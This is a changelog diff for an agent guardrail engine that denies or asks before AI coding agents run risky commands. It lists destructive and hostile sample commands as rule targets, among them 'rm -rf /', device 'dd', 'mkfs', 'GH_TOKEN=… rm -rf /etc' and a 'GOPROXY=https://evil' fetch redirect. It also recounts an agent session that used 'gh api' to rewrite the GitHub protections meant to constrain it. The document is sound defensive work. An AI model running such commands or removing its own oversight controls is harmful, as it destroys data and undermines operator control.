@@ -4,483 +4,163 @@ All notable changes to agent-guardrails. Format: one section per release;
 within a release, grouped by theme. Breaking changes are called out
 explicitly in **Breaking** notes.
 
-## v0.20.27-dev
-- **Fix (#282 M4/C1): two floor classes that only produced false positives are
-  retired.** `Bash(dd *)` blocked `dd if=a.img of=b.img` -- an ordinary file
-  copy -- and the five `Bash(git clean -f*)` globs blocked
-  `git clean -fd --dry-run`, which by definition deletes nothing. Both are
-  prefix matches, so a later no-op flag could not rescue the command.
-  Measured before retiring: the Engine denies **every** destructive member of
-  both families -- `P1.dd` for a device target (`/dev/sda`, `/dev/nvme0n1`),
-  `P1.git-clean` for every forced or recursive clean including `-f`, `-fd`,
-  `-df`, `-xf`, `-fx`, `-fdx` and the spaced `-f -d` -- and deliberately allows
-  the harmless ones. So the floor was not covering a gap; it was contributing
-  refusals the Engine had already decided against.
-  **Claude and OpenCode only. `CodexRules()` keeps both classes**, and that
-  asymmetry is the ADR-0028 carve-out rather than an oversight: Codex's
-  pre-hooks do not dispatch on Windows (openai/codex#24453), so its native
-  floor is not a backstop behind the Engine -- it is the only enforcement it
-  has. Removing a blanket rule there would remove the gate, not a false
-  positive. A test asserts the classes are gone from the shared generator *and*
-  still present in `CodexRules()`, because "make this consistent" is exactly
-  what a later cleanup pass would do to them.
-  OpenCode's permission map is generated from the same `bashDenyGlobs()`, so
-  both planes retire together and cannot drift apart. Floor goldens regenerated
-  on Linux -- 12 deletions, six per plane, nothing else -- because regenerating
-  them on Windows has previously rewritten POSIX paths in place.
-- **Feature (#282): an engine outage is now loud instead of silent.** ADR-0028
-  retires the declarative floor on three planes and accepts that an outage
-  leaves them ungated. It also states the condition that makes the trade
-  defensible: trading silent partial coverage for none is only an improvement
-  if the signal is real. This is the signal, and it is a precondition of the
-  first retirement phase rather than a follow-up to it.
-  Claude Code silently no-ops a failed hook spawn (#151), so nothing in a
-  session announces that enforcement stopped -- calls simply start succeeding,
-  which looks exactly like calls being allowed. The SessionStart advisory now
-  probes whether the engine can still spawn itself (the same cost and the same
-  failure mode every per-call hook pays, #132) and, when it cannot, says so in
-  the one place guardrail is guaranteed to be heard.
-  The advisory is concrete rather than general, because an agent reading
-  "guardrail may be degraded" keeps working as though the boundaries hold. It
-  names what is unchecked -- destructive commands, secret-tier reads,
-  out-of-repo writes, self-config edits -- says nothing is reaching the audit
-  log, and explicitly **withdraws the autonomy instruction** the posture gives
-  two paragraphs earlier: with no guard in place, "operate autonomously" is
-  active misdirection, so the advisory tells the model to surface actions to
-  the operator instead. It ends with what the operator should run.
-  The healthy path stays silent at SessionStart on purpose: a line every
-  session is how an operator learns to skip the section, and this section has
-  to be readable on the day it says something. `doctor` states both outcomes,
-  since there silence cannot be told apart from never having checked.
-  The probe lives in its own file so SessionStart and doctor share one
-  implementation, and it declines to re-exec inside a test binary (#58) rather
-  than running the suite recursively.
-- **Fix (#282 M2/M3): adding a key to the GitHub account, and logging out, now
-  ask.** Both came out of the four-seat gap analysis the same way: three of the
-  four declarative floors gate these commands and the Engine allowed them. With
-  the floors retiring (ADR-0028) the Engine has to carry the policy itself.
-  `gh ssh-key add` and `gh gpg-key add` grant durable access that outlives the
-  session and the token that added it. The Engine looked like it covered part
-  of this already, but only by accident: pointing it at a key file under a
-  secret-tier directory denied because `P4.secret-path` saw a secret-tier
-  *argument*, not because anything understood the command -- point it at
-  `/tmp/key.pub` instead and it allowed. A rule that depends on the spelling of
-  an argument is not a rule about the action. `P2.gh-account-key` now covers
-  add and delete for both key families, because an ask on `add` alone is
-  evadable by reaching for `delete` and removing the operator's own key is its
-  own kind of damage. A secret-tier argument still denies: deny outranks ask,
-  so the path that already worked is not softened.
-  `gh auth logout` destroys the credential the session is running on, which is
-  not a scope question, so it gets `P2.gh-auth-logout` rather than sharing the
-  scope rule's id -- an operator who waives scope widening to run an auth loop
-  should not thereby waive credential destruction.
-  `gh auth login` and `gh auth refresh` without a scope flag stay allowed. That
-  is the deliberate divergence from #228 -- re-authorizing scopes a token
-  already holds is not widening them, and asking for it is how an operator
-  learns to click through the prompts that matter -- and it now has a test that
-  fails if someone later tidies the auth family into asking for all of it.
-  Reads stay allow (`gh ssh-key list`, `gh gpg-key list`, `gh auth status`,
-  `gh auth token`), and the credential-prefix taxonomy is pinned for both new
-  rules so a prefix cannot spell past them.
-- **Docs (#282): ADR-0028 — settings files are user-owned; enforcement lives in
-  the Engine.** Four seat audits mapped every generated floor entry to an
-  Engine verdict: OpenCode's missing-rules list came back *empty* (a 100%
-  mirror), Claude's was four families out of 243 entries, and three of those
-  four are places the Engine is deliberately narrower than a prefix-matching
-  glob rather than safety gaps. The floor was not carrying policy the Engine
-  lacked; it was carrying a second, drifting copy of policy the Engine already
-  had -- 24 entries behind on Claude, 8 on OpenCode and those 8 syntactically
-  dead on the audited host.
-  Antigravity is the existence proof the decision rests on: hook-only on
-  Windows since ADR-0008, zero floor entries, `matcher: "*"` so every call
-  reaches the Engine, 27,000+ evaluations in one audited session, zero drift.
-  The reset generalizes a model already in production rather than proposing an
-  untested one.
-  Settings files return to user-owned content plus marked, manifest-tracked
-  hook registration. Planes retire independently: Antigravity is already at
-  target, OpenCode retires 218 entries, Claude 243 after the Engine gains the
-  working-tree-deletion rule (M1) and the `gh` account-key rule (M2).
-  **Codex is a named exception and keeps its floor as primary enforcement.**
-  Its pre-hooks do not dispatch on Windows (openai/codex#24453), and that is a
-  different thing from Claude's accepted outage exposure: Claude's #151 window
-  is bounded and an outage is an event, while Codex's non-dispatch is the
-  steady state. Removing its floor would leave a plane unmediated while the
-  reset claimed enforcement had moved into the Engine. Retirement is gated on a
-  measurable condition -- `doctor` observing hook dispatch -- not a date.
-  Two posture acceptances are recorded in the ADR rather than left to be
-  inferred from an absence: OpenCode's reads and edits proceed *ungated* during
-  an Engine-unreachable window (bash is unaffected -- it fails closed there
-  whatever the floor says), and Claude is ungated for the whole of an outage
-  because it silently no-ops a failed hook spawn. Silent floor coverage is
-  replaced by a loud one: a SessionStart warning and a doctor probe reporting
-  reachability and per-plane observed dispatch. The trade is only an
-  improvement if the signal is real, so the posture ships with the retirements
-  rather than after them.
-  ADR-0022 is superseded for three planes; its capability table survives as the
-  opencode plugin's contract for the outage mode, since that mode still exists
-  -- what changes is that "proceed under the floor" becomes "proceed ungated".
-- **Feature (#236): doctor reports credential posture, and the docs say how to
-  narrow it.** guardrail and the agent share a trust domain, so every rule is
-  something the agent runs *inside*. The strongest control is the one it cannot
-  reach: the credential simply lacks the authority. guardrail cannot grant that
-  -- only the operator can, at the provider -- so what it does is notice when
-  the ambient credential is wider than the work needs, and say where to read
-  about narrowing it.
-  `docs/operator-hardening.md` is the setup: a fine-grained token scoped to
-  selected repositories with Contents/PRs/Issues read-write and no
-  Administration, Secrets or Workflows; one identity per machine context; hard
-  caps at the biller, which is the only control on the page that bounds a
-  runaway loop rather than a single decision; and the server-side invariants a
-  reduced token cannot undo. It states the limit plainly, because it is easy to
-  assume otherwise: guardrail protects secrets from being *read*, and does not
-  by itself stop ambient authority from being *used*.
-  `guardrail doctor` adds a `credential posture:` section -- advisory, never a
-  failure. It warns on administration-shaped gh scopes (`admin:*`,
-  `delete_repo`, `workflow`, `write:org`, `site_admin`), on more than one gh
-  account being logged in, and on a kubectl context that is not known-local,
-  reusing the Engine's own list so the two cannot disagree about what local
-  means. Credential variables are reported **by name**, because a token in the
-  environment overrides the stored login and the posture just printed may not
-  be the one that applies.
-  It learns all of this without reading or printing credential material: scope
-  names, account counts and variable names only, and the input type has no
-  field that can hold a secret. `repo` is deliberately not warned about --
-  nearly every working login carries it, and a warning everyone sees every time
-  is how an operator learns to click through the ones that matter. Cloud
-  credentials are reported as present but explicitly **not** judged for
-  privilege: establishing that needs a provider call doctor does not make, and
-  a check that guessed would hand out false assurance. Silence in this section
-  means *not known*, never *fine*.
-- **Fix (#228): the `gh` porcelain is classified, so the Engine is no longer
-  weaker than its own backstop.** `gh api -X DELETE repos/o/r/rulesets/1`
-  asked; `gh repo delete o/r --yes` was allowed. Measured on `772392d`, the
-  *entire* porcelain surface was allow -- `gh secret set`, `gh secret delete`,
-  `gh repo edit`, `gh repo archive`, `gh pr merge`, `gh release create|delete`,
-  `gh workflow run`, `gh auth refresh -s admin:org` -- while the api spelling
-  of the same endpoints asked. The porcelain is the easier spelling, so the
-  gate covered only the form an agent reaches for second.
-  Two things made that worse than an ordinary gap. The declarative floor
-  (ADR-0022) already denies `gh repo delete` and asks on `gh secret set`,
-  `gh pr merge`, `gh release create` and `gh workflow run` -- and the floor
-  exists for when the Engine is *unreachable*, so the backstop being stricter
-  than the primary gate is backwards. And the floor is Claude's settings file,
-  so on codex, opencode and antigravity the porcelain was ungated outright and
-  reached the audit log as an allow with no rule attribution.
-  Rule ids are per family, following #235, so an operator running a release
-  loop does not have to waive secret administration to do it:
-  `P2.gh-repo-delete` (the one deny, matching the floor -- deleting the
-  repository is not a setting that can be changed back), `P2.gh-protection`
-  (secrets, variables, `repo edit`, rulesets -- shared with the api rule, since
-  one risk deserves one rule id whichever spelling reaches it),
-  `P2.gh-repo-admin` (archive, rename, transfer), `P2.gh-auth-scope`,
-  `P2.gh-pr-merge`, `P2.gh-workflow-dispatch`, and `P6.publish` for releases,
-  reusing the existing publish family rather than inventing a gh-shaped twin.
-  Scope escalation keys on the flag rather than the verb: `gh auth refresh -s
-  admin:org` asks, plain `gh auth refresh` does not, because re-authorizing the
-  scopes a token already has is not widening them and asking for it would train
-  the operator to click through the ones that do.
-  Reads stay allow throughout and are the larger half of the test set --
-  `gh secret list`, `gh release view`, `gh pr checks`, `gh workflow list`,
-  `gh ruleset view`, `gh auth status`. `gh` is how the fleet checks CI, and
-  prompting on every view is how an operator learns to click through the
-  prompts that matter.
-  **The env-prefix half of #228 needed no code.** Measured first, as directed:
-  the NF-5b/NF-19 shell-state machinery already strips assignment prefixes
-  before any rule sees the command, so `NPM_TOKEN=… npm publish` already asked
-  and `GH_TOKEN=… rm -rf /etc` already denied. `GH_TOKEN=… gh repo delete` was
-  allowed because `gh repo delete` was allowed, with or without a prefix. The
-  full taxonomy -- single, multiple, inline `env`, `env -i`, absolute
-  `/usr/bin/env`, and `export` chains -- is pinned as tests so a credential
-  prefix cannot become a way to spell past a rule that now fires.
-- **Feature (#173): the operator can authorize one exact command instead of
-  losing the action to an out-of-band run.** An Ask that chat cannot clear had
-  one endgame: the operator ran the action outside guardrail, which made the
-  single most consequential command in the session the only one with no audit
-  record. `guardrail approvals grant` converts that into an in-policy,
-  attributed allow.
-  A grant is a relaxation of the same kind the overnight one is, with a smaller
-  blast radius, so it inherits the same limits. ADR-0018's exclusions
-  (`capability-external`, `capability-web-search`, `unknown-native-tool`) and
-  the three fail-closed backstops can never be granted, and the exclusion list
-  is now literally one list that both mechanisms read rather than two copies
-  that drift. Enforcement runs at issuance, which refuses with the reason, and
-  again at match time, so an entry written by hand or left behind by an older
-  binary still cannot relax outward reach.
-  There is no pattern language, and that is a decision rather than an omission.
-  Matching semantics have been this codebase's most reliable source of silent
-  failure -- `gh repo delete*` matched nothing, 23 floor globs were judged
-  against the wrong matcher, and the production and test matchers disagree --
-  and every one of those failed closed. A grant pattern fails the other way,
-  and the agent is the party that asks the operator to issue one. So a grant
-  keys on the exact `(repo, rule ID, command)` triple, compared literally with
-  no trimming or normalization: `git push origin HEAD:main` is not covered by a
-  grant for `git push origin main`, though both push the same branch and raise
-  the same rule.
-  One use by default, not just a window. Every case in the filing needed
-  exactly one successful pass, while a 30-minute window authorizes an unbounded
-  number of them. `--uses N` raises it explicitly, `--for` defaults to 30
-  minutes and is clamped to 24 hours, and the use is spent under the operator
-  lock before the verdict changes so two concurrent calls cannot both spend
-  one. An absent or zero count is spent rather than unlimited, because
-  consumption writes the count back and reading absent as available would renew
-  a spent grant on every load.
-  The ceremony's job is that the operator can verify what they are authorizing
-  by reading it, so the command is shown whole and then again quoted, which
-  makes tabs, trailing spaces and other invisible characters visible. Nothing
-  is truncated and no summary stands in for the string that will be matched.
-  Issuance is refused to anything but an interactive operator terminal.
-  Both ends are audited. Issuance and revocation write an operator record, and
-  a consuming allow is recorded under `ask-allowed-by-operator-grant` carrying
-  the original rule as its origin, so a grant makes an action louder in the
-  record rather than quieter. If that record cannot be written the allow is
-  withdrawn and the rule stays enforced.
-  `guardrail approvals revoke` is included rather than deferred: without it an
-  operator who realises a grant was too broad has no move except waiting out
-  the window, and "wait 29 minutes" is the kind of gap that gets solved by
-  editing the config by hand. `guardrail approvals list --grants` prints what
-  is authorized, in full.
-  A policy Ask now also names this path (#129's sentence, extended). It still
-  rules out the wrong turns agents actually took, but no longer claims no
-  machinery exists for rules where a grant does -- while telling the agent to
-  ask for the command it ran and never a broader form, since composing the
-  request is exactly where an agent could widen it.
-- **Fix (#255): a POSIX path is no longer read as a Win32 one, so `rm -rf /`
-  denies on Windows.** A Bash command's path tokens are POSIX; `ToolCall.CWD`
-  and `RepoRoot` are host paths. `authorizedPath` judged the first against the
-  second with `filepath`, which on Windows reads `/etc` as *relative*:
-  measured, `filepath.IsAbs("/etc")` is false and `filepath.Join(C:\repo,
-  "/etc")` is `C:\repo\etc`. Every POSIX absolute path silently became
-  repo-relative, landed inside the repository, and was authorized. `/` became
-  the repo itself, which is why bare `rm -rf /` -- no wrapper, no redirect, no
-  container -- read as a delete of the working tree's own root and allowed.
-  Not a missing rule: the containment logic was correct and was being handed a
-  path that had already been mistranslated. The fix is the translation ADR-0023
-  built the primitives for and applied at two seams by hand -- `posixIsAbs`,
-  `posixDriveToWin32` -- applied where paths are actually judged. A candidate
-  now records the dialect it was written in at the point it is extracted,
-  never inferred from the string's shape, because `/etc` is also a legal Win32
-  relative path; it is translated once, explicitly, before any `filepath` call.
-  `/c/repo/x` maps to `C:\repo\x` and ordinary Git Bash work is untouched.
-  `/tmp` maps to the host temp root, which is the whole of its handling: the
-  System temp write seam then applies to it unchanged, so descendants stay an
-  authorized write target while the root itself and escapes out of it
-  (`/tmp/../etc`) are protected by the containment that already guards
-  `os.TempDir()`. An absolute POSIX path this host cannot address -- `/`,
-  `/etc`, `/dev/null/child` -- is reported as such rather than guessed at,
-  which routes it to the rule that owns its risk. No fstab reading and no shell
-  probing: that is environment simulation, which ADR-0012 rejects, and it would
-  make a verdict depend on state that can change between check and execution.
-  The translation reconciles two dialects, so it applies only when there are
-  two. A repo root that is itself an unaddressable POSIX path means the whole
-  evaluation is in POSIX coordinates, and folding one side of that would be the
-  same mistranslation in the other direction; `TestTranslationAppliesOnlyToAMixedFrame`
-  pins that boundary rather than leaving it to be discovered. On Linux and
-  macOS the host dialect is POSIX and the translation is the identity by
-  construction, which is how the platforms stay in step without a GOOS branch
-  in any rule.
-  Measured on Windows against the merge base: 29 adversarial nodes close,
-  including `TestHostileOverlayCannotLoosen/recursive_etc_delete` and every
-  `*_recursive_root_delete` wrapper family, with zero new failures; the engine
-  package drops 3 more. No fixture was rewritten into Win32 spellings -- the
-  POSIX forms are reachable through Git Bash, so rewriting them would delete
-  the coverage rather than fix it.
-- **Fix (#235): credentialed CLIs are classified before they publish, deploy or
-  bill.** `npm publish`, `docker push`, `kubectl apply`, `terraform apply`,
-  `vercel --prod` and their families act with authority the agent never reads --
-  the token lives in a keychain, a kubeconfig, or an inherited environment --
-  and none of them touch the working tree, so nothing else in the Engine saw
-  them. Same projection shape as the PowerShell and cmd.exe work: classify the
-  subcommand, hand the verdict to the family that owns the risk.
-  Rule ids are per family (`P6.publish`, `P6.cluster-mutate`, `P6.cloud-mutate`,
-  `P6.deploy`) rather than one blob, so an operator running a Kubernetes dev
-  loop does not have to waive `npm publish` to do it, and so the per-rule
-  verdict profile stays readable.
-  Reads stay allow throughout, and the read twins are the larger half of the
-  test set: `kubectl get`, `aws ec2 describe-instances`, `docker pull`,
-  `terraform plan`, `helm list`, `npm view`. Those are how somebody inspects
-  the system they are about to change, and gating them is how an operator
-  learns to click through the prompts that matter. `--dry-run` stays allow for
-  the same reason: the CLI guarantees no side effect, so the gate has nothing
-  to protect. A local Kubernetes context (`kind-…`, `minikube`,
-  `docker-desktop`, `k3d-…`, `rancher-desktop`) stays allow; an unstated
-  context asks, because the safe reading of "I cannot tell which cluster" is
-  not "it is fine".
-  Cloud CLIs use a read allowlist rather than a mutation list -- enumerating
-  every mutating operation across aws, gcloud and az is not tractable, and
-  unknown-means-ask is the direction a billing mistake should fail in.
-- **Fix (#129): an Ask now says which approval path applies.** Deny verdicts
-  already carried a per-rule continuation; Ask verdicts had one generic
-  sentence for every rule, and "request authorization" reads to a model as
-  "find the technical approval mechanism". Recorded consequences: a
-  `P5.ci-infra-lockfile` ask sent an agent hunting for a URL and reporting
-  "no approval path", and a `P2.git-push-delete` ask sent another to
-  `guardrail approvals list`. Both should have said one sentence to the
-  operator and retried.
-  A policy ask now states that there is no approval URL, no daemon and no
-  `guardrail approvals` command for it -- naming the wrong turns, because the
-  failure was agents looking for machinery that does not exist rather than
-  agents missing an instruction. A broker ask surfaces its approval URL and
-  says chat will not clear it.
-  The path is chosen from the broker state the verdict already carries, not
-  from a list of rule names: a rule list would silently misroute every rule
-  added after it was written. The existing Ask sentences are unchanged --
-  four plane tests pin them -- and the path sentence is added to them.
-- **Fix (#251): the go toolchain is classified per subcommand.** It reached the
-  analyzer as unknown words, so every subcommand was judged alike: not at all.
-  The cut is *whose code*, not whether code executes. `go test` runs module
-  code exactly the way `go run` does -- init(), TestMain, every test body -- so
-  an execution/no-execution line between them does not describe the risk.
-  Running the repository's own packages is not something a static tool-call
-  guard can contain (ADR-0012: the agent authored them and can reach them
-  through Bash a hundred other ways), and `go build`, `go test` and
-  `go run ./cmd/x` are the most frequent commands a Go developer types, so
-  gating them would be friction with no containment gain.
-  What is gated: `go run <remote>` -- a target carrying an `@version` or a
-  domain-shaped first path segment -- asks as the one-step fetch-and-execute,
-  the same class as the `go get`/`go install` ask that already existed;
-  `go mod download` asks as a network fetch; `go env -w GOPROXY=…` and the
-  other fetcher levers (GOFLAGS, GONOSUMDB, GONOSUMCHECK, GOSUMDB, GOINSECURE,
-  GOPRIVATE) deny, the direct analogue of the `npm --registry` and
-  `pip --index-url` denies that were already there; `go mod edit -replace`
-  denies as a redirect to an arbitrary path, while any other `go mod edit`
-  asks, closing the gap between writing go.mod with a tool and writing it with
-  a command; and `-toolexec`/`-vettool` ask wherever they appear, because they
-  run an arbitrary program for every compile step.
-  **The inline form of the redirect needed the tokenizer.** `GOPROXY=https://evil
-  go get x` and `go get x` produce identical argv -- the shell assignment
-  prefix never reaches a rule -- so the per-invocation lever, which leaves no
-  persistent trace and is the likelier shape, was invisible. Simple now carries
-  the Go fetcher variables the same way it already carried GIT_DIR, and the
-  capture reuses that mechanism rather than inventing one.
-- **The floor now mediates the `gh` porcelain that reaches the same endpoints
-  the parser watches.** #252 taught the Engine to read `gh api`'s HTTP method,
-  but the porcelain subcommands reach those endpoints with no method flag to
-  parse: `gh secret set` is a PUT to `actions/secrets`, `gh repo edit
-  --visibility` a PATCH on the repo. Those are shape-level, which is what a
-  floor glob can match, so they belong on the floor rather than in the parser.
-  Asking now: secrets and variables (`set` and `delete` both -- an ask on one
-  verb is evadable by reaching for the other, and breaking CI by removing a
-  token is the same authority as handing CI a token); repository acts under the
-  operator's admin authority (`repo edit|archive|rename|transfer`, alongside
-  the existing `repo delete` deny); the credential family (`auth
-  switch|login|refresh|logout`, `ssh-key add`, `gpg-key add`), which mutates no
-  repository at all but changes *who the agent is* -- a second logged-in
-  account is one command away; and `release edit|upload`, the companion to the
-  existing `release create|delete`.
-  Reads and lists stay allow throughout. Each read in the test set shares a
-  prefix with a mutation above -- `gh secret list` against `gh secret set`,
-  `gh auth status` against `gh auth switch` -- so a glob one character too
-  greedy shows up as a failure rather than as noise in someone's session.
-  Deliberately left out, and named so the omission is a decision rather than an
-  oversight: `gh pr close`, `gh issue close|delete`, `gh run rerun|cancel`,
-  `gh codespace create`, `gh gist create --public`. All outward-facing, none
-  authority-changing or irreversible, and #228 itself marks them as candidates
-  rather than settled.
-  The #249 guard did its job on the way in: all 16 new globs failed the build
-  until each was paired with the command it exists to stop, and the
-  known-broken list stayed at 23 -- no new breakage introduced.
-- **Fix (#228): rewriting a GitHub protection through `gh api` now asks.** An
-  agent running under the operator's `gh` login holds the operator's full
-  repo-admin authority, and every GitHub-side protection is editable by that
-  same token -- so the protections do not bind the agent, which can remove a
-  protection and then do the thing it blocked. #228 records this happening: a
-  session rewrote this repository's `main` ruleset bypass actors, created a tag
-  ruleset, changed the Actions permissions policy and enabled immutable
-  releases, all through plain `gh api`, all evaluated as ordinary commands.
-  All six of those calls, and their inverses that remove the protections,
-  now ask.
-  The floor's glob pair (#232) could not reach this and the gap was documented
-  there: the method lives in a flag, the endpoint carries slashes, and a glob
-  does not cross a separator -- measured, the method-aware globs caught 2 of 6
-  mutating spellings while the only shape catching all six also matched every
-  read. The Engine parses the method instead, which is the point of having a
-  precise layer. `gh api` defaults to GET, an explicit `-X`/`--method` wins,
-  and a body flag (`-f`, `-F`, `--field`, `--raw-field`, `--input`) implies a
-  POST with no method flag present anywhere in the command -- the inference a
-  glob cannot make, pinned by its own test.
-  **Reads stay allow**, including an explicit `-X GET`, `--paginate` and
-  `--jq`: auditing these endpoints is routine, and a rule that prompts on
-  inspection is how an operator learns to stop reading the prompts. Ordinary
-  mutations stay allow too -- posting an issue comment is not an admin act.
-  Path spellings do not evade it: a leading slash, a full `https://api.github.com`
-  URL, `--hostname` for GHES and mixed case all normalise to one comparison. A
-  `gh api graphql` call whose query text contains `mutation` asks, which is
-  #228's stated minimum bar for the transport that can perform the same
-  mutations behind a path that says nothing.
-  Deliberately an ask and not a deny, per #228's non-goals: the operator may
-  change their own settings, they just have to be the one deciding. The
-  porcelain families (`gh secret set`, `gh repo edit`, `gh auth switch`,
-  env-prefixed tokens) and the other transports (`curl` to `api.github.com`)
-  are the rest of #228 and are not handled here.
-- **`guardrail audit --verdicts`: what the guard decided, not just that it
-  ran.** The evidence gate answers "is the guard present" -- it counts records
-  and looks for two pre-hook records in one real session. A guard that runs and
-  allows everything passes it identically to one that is working. The new view
-  reads the same log by rule: deny/ask/allow counts, how many distinct sessions
-  each rule fired in, and the worst single session, over the deployed binary's
-  mtime window. No schema change; `decision`, `rule_id` and `session_id` were
-  already there.
-- **Ask pressure, and an honest statement of what it is not.** The metric
-  asked for was the ratio of asks answered yes without reading. That is not
-  computable from this log and no amount of querying makes it so: guardrail
-  never learns how a prompt was answered, because the hook returns `ask`, the
-  human answers inside the plane, and no record comes back -- there is no
-  second event to time or to read an outcome from, and no call-correlation id
-  to join on. Measured on real data: 434 `post` records against 23,677 `pre`.
-  So the output reports concentration instead -- how often one rule interrupts
-  one session -- and says in the output, not just in a commit message, that it
-  cannot see how the asks were answered. On this machine's log it immediately
-  found a session asked **119 times by `P3.unresolved`** and another **304
-  times by `capability-external`**, which is the shape that turns a gate into
-  a formality.
-- **"No audit log" no longer reads as "nothing was decided."** Those are
-  different answers and the second one is reassuring, so an absent log now
-  fails loudly instead of rendering as an empty profile.
-- **The floor generator now proves each glob matches the command it exists to
-  stop.** A glob that matches nothing is worse than a missing one: it reads
-  correct in review, appears in the golden file, and stops nothing. #232 found
-  the first instance -- `gh repo delete*` does not match
-  `gh repo delete owner/repo`, because `*` does not cross a path separator and
-  a pattern containing no slash cannot match a subject that does. Every deny
-  and ask glob is now paired with its canonical dangerous command, and a glob
-  that does not match its own example fails the build. Adding a glob without an
-  example fails too, so the pairing cannot rot, and a known-broken entry that
-  starts matching fails until it is removed from the exemption list.
-  Scope is the deny and ask lists on purpose: an allow glob matching nothing
-  merely fails to grant an exemption, which is fail-closed, while a deny or ask
-  glob matching nothing is fail-open.
-  **The guard immediately found 23 more (#244)**, including `sudo *`, `dd *`,
-  `mkfs*`, `shred *`, `wipefs *`, `chmod 777 *` and guardrail's own
-  `rm *guardrail/sessions/*`. They are recorded as known-broken with the issue
-  attached rather than rewritten here, because the right replacement depends on
-  the production matchers' real semantics, which cannot be established from
-  inside this repo -- and a rewrite tuned to the wrong model would be worse
-  than the list, because it would look fixed. Shrinking that list is the fix;
-  the guard stops a 24th.
-- **The declarative floor now mediates the GitHub CLI.** `gh` is a shell
-  command that mutates state nothing in the working tree reflects: it merges
-  pull requests, cuts and deletes releases, dispatches workflows and deletes
-  repositories. None of that was on the floor, so with the Engine unreachable
-  (ADR-0022) those ran unmediated. `gh pr merge`, `gh release create|delete`
-  and `gh workflow run` now ask; `gh repo delete` denies. Reads stay allow --
-  `gh` is how the fleet checks CI, and prompting on every `gh pr view` trains
-  people to click through the prompts that matter. Both planes inherit the
-  entries from one source, because OpenCode rewrites the same two glob
-  functions Claude reads.
-  **The glob shape is load-bearing.** `*` does not cross a path separator in
-  the permission matcher, so the obvious `gh repo delete*` silently fails to
-  match `gh repo delete owner/repo` -- the single most likely spelling of the
-  command it exists to stop. Measured before it shipped rather than after; the
-  brace alternation `{,**}` matches the bare subcommand and any slash-bearing
-  argument, and a test fails if a bare trailing star reappears.
-  **`gh api` is only partly covered, and the limit is stated rather than
-  papered over.** The method lives in a flag, the endpoint carries slashes, and
-  no glob that catches `gh api repos/o/r -X POST` fails to also catch every
-  read: measured, the method-aware shapes reach 2 of 6 mutating spellings at
-  zero false positives, while the only shape reaching 6 of 6 also matches every
-  `gh api` view. So the floor asks for a method flag written *before* the
-  endpoint and leaves the rest to the Engine (#228), instead of claiming a
-  coverage it does not have.
+## v0.23.0-dev
+
+### Engine Enforcement & Policy
+- **Fix (#282 M1, #288): deny working-tree and repository root deletion.** Semantic
+  containment previously allowed recursive/forced deletion of the current working
+  directory (`.`), parent (`..`), and repository root (`$PWD`) because they
+  resolved inside the repository. `isWorkingTreeDeletion` now checks deletion
+  targets against session CWD and repo root; matching targets deny under
+  `P1.rm-rf`. Unresolvable operands fail closed to `P3.unresolved`. Deletions of
+  subdirectories within CWD and safe-root siblings remain permitted; non-recursive
+  `rmdir` retains `P1.rmdir` ask. Honors operand classification: uses effective
+  directory from cd tracking (`NF-6`), skips find callbacks (`NF-9`), and respects
+  chroot re-rooting (`P3.unresolved`).
+- **Fix (#255, #269): judge POSIX paths in POSIX coordinates, denying `rm -rf /`
+  on Windows.** Bash command path tokens are POSIX while Windows host paths are Win32.
+  `authorizedPath` previously used `filepath`, which treats `/etc` and `/` as
+  Win32 relative paths, causing absolute POSIX paths to be misclassified as
+  inside the repository. Paths are now evaluated in their source dialect before
+  explicit translation, closing 29 adversarial cases (`bash -c`, `busybox`,
+  `chroot`, `setsid`, `docker`, `ssh`). `/c/repo` translates to `C:\repo`; `/tmp`
+  maps to the host temp root with system temp containment. `mv` source path dialect
+  preserved (#283).
+- **Fix (#228, #275, #289 M2/M3): classify GitHub CLI porcelain commands.** The
+  Engine previously mediated only `gh api` calls while ordinary porcelain commands
+  were allowed:
+  - `gh repo delete`: **denied** (`P2.gh-repo-delete`).
+  - `gh secret set/delete`, `gh variable set/delete`, `gh repo edit`,
+    `gh ruleset ...`: ask (`P2.gh-protection`, shared with `gh api` protections).
+  - `gh repo archive/rename/transfer`: ask (`P2.gh-repo-admin`).
+  - `gh pr merge`: ask (`P2.gh-pr-merge`).
+  - `gh release create/delete/edit/upload`: ask (`P6.publish`).
+  - `gh workflow run/enable/disable`: ask (`P2.gh-workflow-dispatch`).
+  - `gh auth refresh -s ...`, `gh auth login --scopes ...`, `gh auth switch`:
+    ask (`P2.gh-auth-scope`).
+  - `gh auth logout`: asks (`P2.gh-auth-logout`, M3).
+  - `gh ssh-key add/delete`, `gh gpg-key add/delete`: ask (`P2.gh-account-key`, M2).
+  - Reads (`gh secret list`, `gh release view`, `gh pr checks`, `gh run view`,
+    `gh auth status`, `gh ssh-key list`) and unscoped `gh auth login/refresh`
+    remain allowed. Command assignment prefixes (`GH_TOKEN=...`, `env`) are
+    stripped before classification (`NF-5b`/`NF-19`).
+- **Fix (#228, #252): mutating GitHub repository protections via `gh api` asks.**
+  `gh api` calls that create, update, or delete branch rulesets, repository
+  bypass actors, actions permissions, or release immutability ask under
+  `P2.gh-protection`. Parses HTTP method flags (`-X`, `--method`) and infers
+  mutations from body flags (`-f`, `-F`, `--field`, `--raw-field`, `--input`).
+  `gh api graphql` containing `mutation` queries asks. Reads stay allowed.
+- **Fix (#235, #264): classify credentialed CLIs before they publish, deploy, or bill.**
+  `npm publish`, `docker push`, `kubectl apply`, `terraform apply`, `vercel --prod`
+  and their mutating operations ask under dedicated family IDs (`P6.publish`,
+  `P6.cluster-mutate`, `P6.cloud-mutate`, `P6.deploy`). Reads (`kubectl get`,
+  `docker pull`, `terraform plan`, `npm view`) and `--dry-run` remain allowed.
+  Known-local Kubernetes contexts (`kind-`, `minikube`, `docker-desktop`,
+  `k3d-`, `rancher-desktop`) remain allowed; unstated contexts ask. Cloud CLIs
+  enforce unknown-means-ask for mutating commands.
+- **Fix (#251, #262): classify the Go toolchain per subcommand.** `go run <remote>`
+  and `go mod download` ask as network fetchers; fetcher environment levers
+  (`GOPROXY`, `GONOSUMDB`, `GOFLAGS`, `GOSUMDB`, `GOINSECURE`, `GOPRIVATE`) and
+  `go mod edit -replace` deny; `go mod edit` asks; `-toolexec`/`-vettool` ask.
+  Tokenizer captures shell assignment prefixes for Go fetcher variables.
+  `go build` and `go test` remain allowed.
+- **Feature (#140, #280): machine power control asks in every shell, never night-relaxed.**
+  `shutdown`, `reboot`, `systemctl poweroff` and PowerShell equivalents ask under
+  `P1.power-control` and are excluded from overnight relaxation.
+- **Feature (#267, ADR-0026): pin built-in and overlay verdict combination by severity.**
+  Overlay rules can tighten a built-in rule but never loosen it; equal verdicts
+  report the built-in rule attribution.
+
+### Grants & Approvals
